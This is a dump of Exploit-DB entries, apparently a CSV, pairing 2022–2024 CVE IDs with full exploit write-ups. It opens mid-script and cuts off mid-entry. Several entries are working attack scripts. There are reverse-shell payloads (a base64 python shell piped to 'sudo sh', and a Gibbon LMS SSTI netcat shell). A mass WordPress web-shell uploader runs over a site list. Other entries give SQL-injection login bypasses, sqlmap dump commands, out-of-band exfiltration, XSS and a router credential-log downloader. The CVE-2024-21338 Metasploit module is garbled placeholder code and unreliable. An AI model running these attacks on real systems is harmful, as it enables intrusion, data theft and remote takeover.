0 return is_https except Exception as e: print(""ERROR! The Exception is:"" + format(e)) if https == 1: return ""https://"" + target_url else: return ""http://"" + target_url def exp(target,ip,lhost, lport): payload = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""' + lhost + '"",' + lport + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/bash"")\'' print(""[*]Payload is: "" + payload) b64_payload = base64.b64encode(payload.encode()) print(""[*]Base64 encoding payload is: "" + b64_payload.decode()) exp_url = target + '/worker/cpu_profile?pid=3354&ip=' + str(ip) + '&duration=5&native=0&format=`echo ' + b64_payload.decode() + ' |base64$IFS-d|sudo%20sh`' # response = requests.get(url=exp_url, headers=headers, verify=False, timeout=3, prxoy=proxiess) print(exp_url) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=exp_url, headers=headers, verify=False) if response.status_code == 200: print(""[-]ERROR: Exploit Failed,please check the payload."") else: print(""[+]Exploit is finished,please check your machine!"") if __name__ == '__main__': parser = argparse.ArgumentParser( description=''' formatter_class=argparse.RawDescriptionHelpFormatter, parser.add_argument('-t', '--target', type=str, required=True, help='tart ip') parser.add_argument('-p', '--port', type=str, default=80, required=False, help='tart host port') parser.add_argument('-L', '--lhost', type=str, required=True, help='listening host ip') parser.add_argument('-P', '--lport', type=str, default=80, required=False, help='listening port') args = parser.parse_args() # target = args.target ip = args.target # port = args.port # lhost = args.lhost # lport = args.lport targeturl = check_url(args.target, args.port) print(targeturl) print(""[*] Checking in url: "" + targeturl) exp(targeturl, ip, args.lhost, args.lport)"
CVE-2024-21338,2024-04-02,exploit db,"# Exploit Title : Microsoft Windows 10.0.17763.5458 - Kernel Privilege Escalation # Exploit Author: E1 Coders # CVE: CVE-2024-21338 require 'msf/core' class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::DCERPC include Msf::Exploit::Remote::DCERPC::MS08_067::Artifact def initialize(info = {}) super( update_info( info, 'Name' => 'CVE-2024-21338 Exploit', 'Description' => 'This module exploits a vulnerability in FooBar version 1.0. It may lead to remote code execution.', 'Author' => 'You', 'License' => MSF_LICENSE, 'References' => [ ['CVE', '2024-21338'] register_options( OptString.new('RHOST', [true, 'The target address', '127.0.0.1']), OptPort.new('RPORT', [true, 'The target port', 1234]) end def check connect begin impacket_artifact(dcerpc_binding('ncacn_ip_tcp'), 'FooBar') rescue Rex::Post::Meterpreter::RequestError return Exploit::CheckCode::Safe end Exploit::CheckCode::Appears end def exploit connect begin impacket_artifact( dcerpc_binding('ncacn_ip_tcp'), 'FooBar', datastore['FooBarPayload'] rescue Rex::Post::Meterpreter::RequestError fail_with Failure::UnexpectedReply, 'Unexpected response from impacket_artifact' end handler disconnect end end #refrence : https://nvd.nist.gov/vuln/detail/CVE-2024-21338"
CVE-2024-27356,2024-04-02,exploit db,"# Exploit Title: GL-iNet MT6000 4.5.5 - Arbitrary File Download # CVE: CVE-2024-27356 # Google Dork: intitle:""GL.iNet Admin Panel"" # Date: 2/26/2024 # Exploit Author: Bandar Alharbi (aggressor) # Vendor Homepage: www.gl-inet.com # Tested Software Link: https://fw.gl-inet.com/firmware/x3000/release/openwrt-x3000-4.0-0406release1-0123-1705996441.bin # Tested Model: GL-X3000 Spitz AX # Affected Products and Firmware Versions: https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Download_file_vulnerability.md import sys import requests import json requests.packages.urllib3.disable_warnings() h = {'Content-type':'application/json;charset=utf-8', 'User-Agent':'Mozilla/5.0 (compatible;contxbot/1.0)'} def DoesTarExist(): r = requests.get(url+""/js/logread.tar"", verify=False, timeout=30, headers=h) if r.status_code == 200: f = open(""logread.tar"", ""wb"") f.write(r.content) f.close() print(""[*] Full logs archive `logread.tar` has been downloaded!"") print(""[*] Do NOT forget to untar it and grep it! It leaks confidential info such as credentials, registered Device ID and a lot more!"") return True else: print(""[*] The `logread.tar` archive does not exist however ... try again later!"") return False def isVulnerable(): r1 = requests.post(url+""/rpc"", verify=False, timeout=30, headers=h) if r1.status_code == 500 and ""nginx"" in r1.text: r2 = requests.get(url+""/views/gl-sdk4-ui-login.common.js"", verify=False, timeout=30, headers=h) if ""Admin-Token"" in r2.text: j = {""jsonrpc"":""2.0"",""id"":1,""method"":""call"",""params"":["""",""ui"",""check_initialized""]} r3 = requests.post(url+""/rpc"", verify=False, json=j, timeout=30, headers=h) ver = r3.json()['result']['firmware_version'] model = r3.json()['result']['model'] if ver.startswith(('4.')): print(""[*] Firmware version (%s) is vulnerable!"" %ver) print(""[*] Device model is: %s"" %model) return True print(""[*] Either the firmware version is not vulnerable or the target may not be a GL.iNet device!"") return False def isAlive(): try: r = requests.get(url, verify=False, timeout=30, headers=h) if r.status_code != 200: print(""[*] Make sure the target's web interface is accessible!"") return False elif r.status_code == 200: print(""[*] The target is reachable!"") return True except Exception: print(""[*] Error occurred when connecting to the target!"") pass return False if __name__ == '__main__': if len(sys.argv) != 2: print(""exploit.py url"") sys.exit(0) url = sys.argv[1] url = url.lower() if not url.startswith(('http://', 'https://')): print(""[*] Invalid url format! It should be http[s]:// "") sys.exit(0) if url.endswith(""/""): url = url.rstrip(""/"") print(""[*] GL.iNet Unauthenticated Full Logs Downloader"") try: if (isAlive() and isVulnerable()) == (True and True): DoesTarExist() except KeyboardInterrupt: print(""[*] The exploit has been stopped by the user!"") sys.exit(0)"
CVE-2024-29410,2024-04-02,exploit db,# Exploit Title: Petrol Pump Management Software v1.0 - Remote Code Execution (RCE) # Date: 02/04/2024 # Exploit Author: Sandeep Vishwakarma # Vendor Homepage: https://www.sourcecodester.com # Software Link:https://www.sourcecodester.com/php/17180/petrol-pump-management-software-free-download.html # Version: v1.0 # Tested on: Windows 10 # CVE: CVE-2024-29410 # Description: File Upload vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the logo Photos parameter in the web_crud.php component.
CVE-2024-24499,2024-04-02,exploit db,"# Exploit Title: Employee Management System 1.0 - `txtfullname` and `txtphone` SQL Injection # Date: 2 Feb 2024 # Exploit Author: Yevhenii Butenko # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/16999/employee-management-system.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2024-24499 ### SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. ### Affected Components: > /employee_akpoly/Admin/edit_profile.php > Two parameters `txtfullname` and `txtphone` within admin edit profile mechanism are vulnerable to SQL Injection. ![txtfullname](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_edit_txtfullname_sqli.png?raw=true) ![txtphone](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_edit_txtphone_sqli.png?raw=true) ### Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. ## Proof of Concept: ### SQLMap Save the following request to `edit_profile.txt`: POST /employee_akpoly/Admin/edit_profile.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 88 Origin: http://localhost Connection: close Referer: http://localhost/employee_akpoly/Admin/edit_profile.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtfullname=Caroline+Bassey&txtphone=0905656&old_image=uploadImage%2Fbird.jpg&btnupdate= Use `sqlmap` with `-r` option to exploit the vulnerability: sqlmap -r edit_profile.txt --level 5 --risk 3 --batch --dbms MYSQL --dump ## Recommendations When using this Employee Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24497,2024-04-02,exploit db,"# Exploit Title: Employee Management System 1.0 - `txtusername` and `txtpassword` SQL Injection (Admin Login) # Date: 2 Feb 2024 # Exploit Author: Yevhenii Butenko # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/16999/employee-management-system.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2024-24497 ### SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. ### Affected Components: > /employee_akpoly/Admin/login.php > Two parameters `txtusername` and `txtpassword` within admin login mechanism are vulnerable to SQL Injection. ![txtusername](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_login_txtusername_sqli.png?raw=true) ![txtpassword](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_login_txtpassword_sqli.png?raw=true) ### Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. ## Proof of Concept: ### Manual Exploitation The payload `' and 1=1-- -` can be used to bypass authentication within admin login page. POST /employee_akpoly/Admin/login.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 61 Origin: http://localhost Connection: close Referer: http://localhost/employee_akpoly/Admin/login.php Cookie: PHPSESSID=lcb84k6drd2tepn90ehe7p9n20 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtusername=admin' and 1=1-- -&txtpassword=password&btnlogin= ### SQLMap Save the following request to `admin_login.txt`: POST /employee_akpoly/Admin/login.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 62 Origin: http://localhost Connection: close Referer: http://localhost/employee_akpoly/Admin/login.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtusername=admin&txtpassword=password&btnlogin= Use `sqlmap` with `-r` option to exploit the vulnerability: sqlmap -r admin_login.txt --level 5 --risk 3 --batch --dbms MYSQL --dump ## Recommendations When using this Employee Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24494,2024-04-02,exploit db,"# Exploit Title: Daily Habit Tracker 1.0 - Stored Cross-Site Scripting (XSS) # Date: 2 Feb 2024 # Exploit Author: Yevhenii Butenko # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2024-24494 ### Stored Cross-Site Scripting (XSS): > Stored Cross-Site Scripting (XSS) is a web security vulnerability where an attacker injects malicious scripts into a web application's database. The malicious script is saved on the server and later rendered in other users' browsers. When other users access the affected page, the stored script executes, potentially stealing data or compromising user security. ### Affected Components: > add-tracker.php, update-tracker.php Vulnerable parameters: - day - exercise - pray - read_book - vitamins - laundry - alcohol - meat ### Description: > Multiple parameters within `Add Tracker` and `Update Tracker` requests are vulnerable to Stored Cross-Site Scripting. The application failed to sanitize user input while storing it to the database and reflecting back on the page. ## Proof of Concept: The following payload ` ` can be used in order to exploit the vulnerability. Below is an example of a request demonstrating how a malicious payload can be stored within the `day` value: POST /habit-tracker/endpoint/add-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 175 Origin: http://localhost DNT: 1 Connection: close Referer: http://localhost/habit-tracker/home.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 date=1992-01-12&day=Tuesday%3Cscript%3Ealert%28%27STORED_XSS%27%29%3C%2Fscript%3E&exercise=Yes&pray=Yes&read_book=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes ![XSS Fired](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/xss.png?raw=true) ## Recommendations When using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24495,2024-04-02,exploit db,"# Exploit Title: Daily Habit Tracker 1.0 - SQL Injection # Date: 2 Feb 2024 # Exploit Author: Yevhenii Butenko # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2024-24495 ### SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. ### Affected Components: > delete-tracker.php ### Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. ## Proof of Concept: ### Manual Exploitation The payload `'"""";SELECT SLEEP(5)#` can be employed to force the database to sleep for 5 seconds: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5'""""%3bSELECT+SLEEP(5)%23 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 ![5 seconds delay](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/sqli.png?raw=true) ### SQLMap Save the following request to `delete_tracker.txt`: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Use `sqlmap` with `-r` option to exploit the vulnerability: sqlmap -r ./delete_tracker.txt --level 5 --risk 3 --batch --technique=T --dump ## Recommendations When using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24496,2024-04-02,exploit db,"# Exploit Title: Daily Habit Tracker 1.0 - Broken Access Control # Date: 2 Feb 2024 # Exploit Author: Yevhenii Butenko # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2024-24496 ### Broken Access Control: > Broken Access Control is a security vulnerability arising when a web application inadequately restricts user access to specific resources and functions. It involves ensuring users are authorized only for the resources and functionalities intended for them. ### Affected Components: > home.php, add-tracker.php, delete-tracker.php, update-tracker.php ### Description: > Broken access control enables unauthenticated attackers to access the home page and to create, update, or delete trackers without providing credentials. ## Proof of Concept: ### Unauthenticated Access to Home page > To bypass authentication, navigate to 'http://yourwebsitehere.com/home.php'. The application does not verify whether the user is authenticated or authorized to access this page. ### Create Tracker as Unauthenticated User To create a tracker, use the following request: POST /habit-tracker/endpoint/add-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 108 Origin: http://localhost DNT: 1 Connection: close Referer: http://localhost/habit-tracker/home.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 date=1443-01-02&day=Monday&exercise=Yes&pray=Yes&read_book=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes ### Update Tracker as Unauthenticated User To update a tracker, use the following request: POST /habit-tracker/endpoint/update-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 121 Origin: http://localhost DNT: 1 Connection: close Referer: http://localhost/habit-tracker/home.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 tbl_tracker_id=5&date=1443-01-02&day=Monday&exercise=No&pray=Yes&read_book=No&vitamins=Yes&laundry=No&alcohol=No&meat=Yes ### Delete Tracker as Unauthenticated User: To delete a tracker, use the following request: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Referer: http://localhost/habit-tracker/home.php Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 ## Recommendations When using this tracking system, it is essential to update the application code to ensure that proper access controls are in place."
CVE-2022-4395,2024-04-02,exploit db,"# Exploit Title: Wordpress Plugin - Membership For WooCommerce < v2.1.7 - Arbitrary File Upload to Shell (Unauthenticated) # Date: 2024-02-25 # Author: Milad Karimi (Ex3ptionaL) # Category : webapps # Tested on: windows 10 , firefox import sys , requests, re , json from multiprocessing.dummy import Pool from colorama import Fore from colorama import init init(autoreset=True) headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 'referer': 'www.google.com'} uploader = """""" GIF89a Resultz Uploader Uploaded """""" requests.urllib3.disable_warnings() def Exploit(Domain): try: if 'http' in Domain: Domain = Domain else: Domain = 'http://'+Domain myup = {'': ('db.php', uploader)} req = requests.post(Domain + '/wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload', files=myup, headers=headers,verify=False, timeout=10).text req1 = requests.get(Domain + '/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php') if 'Ex3ptionaL' in req1: print (fg+'[+] '+ Domain + ' --> Shell Uploaded') open('Shellz.txt', 'a').write(Domain + '/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php' + '\n') else: print (fr+'[+] '+ Domain + '{}{} --> Not Vulnerability') except: print(fr+' -| ' + Domain + ' --> {} [Failed]') target = open(input(fm+""Site List: ""), ""r"").read().splitlines() mp = Pool(int(input(fm+""Threads: ""))) mp.map(Exploit, target) mp.close() mp.join()"
CVE-2023-34927,2024-04-02,exploit db,"# Exploit Title: Casdoor < v1.331.0 - '/api/set-password' CSRF # Application: Casdoor # Version: <= 1.331.0 # Date: 03/07/2024 # Exploit Author: Van Lam Nguyen # Vendor Homepage: https://casdoor.org/ # Software Link: https://github.com/casdoor/casdoor # Tested on: Windows # CVE : CVE-2023-34927 Overview Casdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL. Proof of Concept Made an unauthorized request to /api/set-password that bypassed the old password entry authentication step If a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials userOwner: built-in userName: admin newPassword: hacked"
CVE-2024-24724,2024-04-02,exploit db,"# Exploit Title: Gibbon LMS v26.0.00 - SSTI vulnerability # Date: 21.01.2024 # Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli) # Vendor Homepage: https://gibbonedu.org/ # Software Link: https://github.com/GibbonEdu/core # Version: v26.0.00 # Tested on: Ubuntu 22.0 # CVE : CVE-2024-24724 import requests import re import sys def login(target_host, target_port,email,password): url = f'http://{target_host}:{target_port}/login.php?timeout=true' headers = {""Content-Type"": ""multipart/form-data; boundary=---------------------------174475955731268836341556039466""} data = f""-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""address\""\r\n\r\n\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""method\""\r\n\r\ndefault\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""username\""\r\n\r\n{email}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""password\""\r\n\r\n{password}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""gibbonSchoolYearID\""\r\n\r\n025\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""gibboni18nID\""\r\n\r\n0002\r\n-----------------------------174475955731268836341556039466--\r\n"" r = requests.post(url, headers=headers, data=data, allow_redirects=False) Session_Cookie = re.split(r""\s+"", r.headers['Set-Cookie']) if Session_Cookie[4] is not None and '/index.php' in str(r.headers['Location']): print(""login successful!"") return Session_Cookie[4] def rce(cookie, target_host, target_port, attacker_ip, attacker_port): url = f'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php' headers = {""Content-Type"": ""multipart/form-data; boundary=---------------------------67142646631840027692410521651"", ""Cookie"": cookie} data = f""-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""address\""\r\n\r\n/modules/School Admin/messengerSettings.php\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""enableHomeScreenWidget\""\r\n\r\nY\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""signatureTemplate\""\r\n\r\n{{{{[\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f']|filter('system')}}}}\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""messageBcc\""\r\n\r\n\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""pinnedMessagesOnHome\""\r\n\r\nN\r\n-----------------------------67142646631840027692410521651--\r\n"" r = requests.post(url, headers=headers, data=data, allow_redirects=False) if 'success0' in str(r.headers['Location']): print(""Payload uploaded successfully!"") def trigger(cookie, target_host, target_port): url = f'http://{target_host}:{target_port}/index.php?q=/modules/School%20Admin/messengerSettings.php&return=success0' headers = {""Cookie"": cookie} print(""RCE successful!"") r = requests.get(url, headers=headers, allow_redirects=False) if __name__ == '__main__': if len(sys.argv) != 7: print(""Usage: script.py "") sys.exit(1) cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6]) rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]) trigger(cookie, sys.argv[1], sys.argv[2])"
CVE-2023-48974,2024-04-02,exploit db,"# Exploit Title: Axigen < 10.5.7 - Persistent Cross-Site Scripting # Date: 2023-09-25 # Exploit Author: Vinnie McRae - RedTeamer IT Security # Vendor Homepage: https://www.axigen.com/ # Software Link: https://www.axigen.com/mail-server/download/ # Version: (10.5.7) and older version of Axigen WebMail # Tested on: firefox, chrome # CVE: CVE-2023-48974 Description The `serverName_input` parameter is vulnerable to stored cross-site scripting (XSS) due to unsanitized or unfiltered processing. This means that an attacker can inject malicious code into this parameter, which will then be executed by other users when they view the page where the parameter is used. This is affecting authenticated administrators, and the attack can be used to attack other administrators with more permissions. Exploitation 1. Login as administrator 2. Navigate to ""global settings"" 3. Change server name to"
CVE-2023-6538,2024-03-20,exploit db,"# Exploit Title: Hitachi NAS (HNAS) System Management Unit (SMU) 14.8.7825 - Information Disclosure # CVE: CVE-2023-6538 # Date: 2023-12-13 # Exploit Author: Arslan Masood (@arszilla) # Vendor: https://www.hitachivantara.com/ # Version: < 14.8.7825.01 # Tested On: 13.9.7021.04 import argparse from os import getcwd import requests parser = argparse.ArgumentParser( description=""CVE-2023-6538"
CVE-2024-28595,2024-03-20,exploit db,"# Exploit Title: Employee Management System 1.0 - 'admin_id' SQLi # Date: 20-03-2024 # Exploit Author: Shubham Pandey # Vendor Homepage: https://www.sourcecodester.com # Software Link: https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html # Version: 1.0 # Tested on: Windows, Linux # CVE : CVE-2024-28595 # Description: SQL Injection vulnerability in Employee Management System v1.0 allows attackers to run arbitrary SQL commands via the admin_id parameter in update-admin.php."
CVE-2023-46022,2024-03-20,exploit db,"# Exploit Title: Blood Bank 1.0 - 'bid' SQLi # Date: 2023-11-15 # Exploit Author: Ersin Erenler # Vendor Homepage: https://code-projects.org/blood-bank-in-php-with-source-code # Software Link: https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip # Version: 1.0 # Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0 # CVE : CVE-2023-46022 # Description: The 'bid' parameter in the /delete.php file of Code-Projects Blood Bank V1.0 is susceptible to Out-of-Band SQL Injection. This vulnerability stems from inadequate protection mechanisms, allowing attackers to exploit the parameter using Burp Collaborator to initiate OOB SQL injection attacks. Through this technique, an attacker can potentially extract sensitive information from the databases. Vulnerable File: /delete.php Parameter Name: bid # Proof of Concept: 1. Intercept the request to cancel.php via Burp Suite 2. Inject the payload to the vulnerable parameters 3. Payload: 3'%2b(select%20load_file(concat('\\\\',version(),'.',database(),'.collaborator-domain\\a.txt')))%2b' 4. Example request for bid parameter: GET /bloodbank/file/delete.php?bid=3'%2b(select%20load_file(concat('\\\\',version(),'.',database(),'.domain.oastify.com\\a.txt')))%2b' HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: close Referer: http://localhost/bloodbank/bloodinfo.php Cookie: PHPSESSID= Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 5. Database and version information is seized via Burp Suite Collaborator"
CVE-2023-46024,2024-03-20,exploit db,"# Exploit Title: Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi # Date: 2023-11-15 # Exploit Author: Ersin Erenler # Vendor Homepage: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql # Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=17645 # Version: 1.0 # Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0 # CVE : CVE-2023-46024 # Description: Teacher Subject Allocation Management System V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'searchdata' parameter in the index.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database. Vulnerable File: /index.php Parameter Name: searchdata # Proof of Concept: Execute sqlmap using either the 'searchdata' parameter to retrieve the current database: sqlmap -u ""http://localhost/Tsas"" --method POST --data ""searchdata=test&search="" -p searchdata --risk 3 --level 3 --dbms mysql --batch --current-db SQLMap Response: Parameter: searchdata (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: searchdata=test%' AND 3912=3912 AND 'qxHV%'='qxHV&search= Type: error-based Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: searchdata=test%' AND (SELECT 1043 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(1043=1043,1))),0x717a787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS 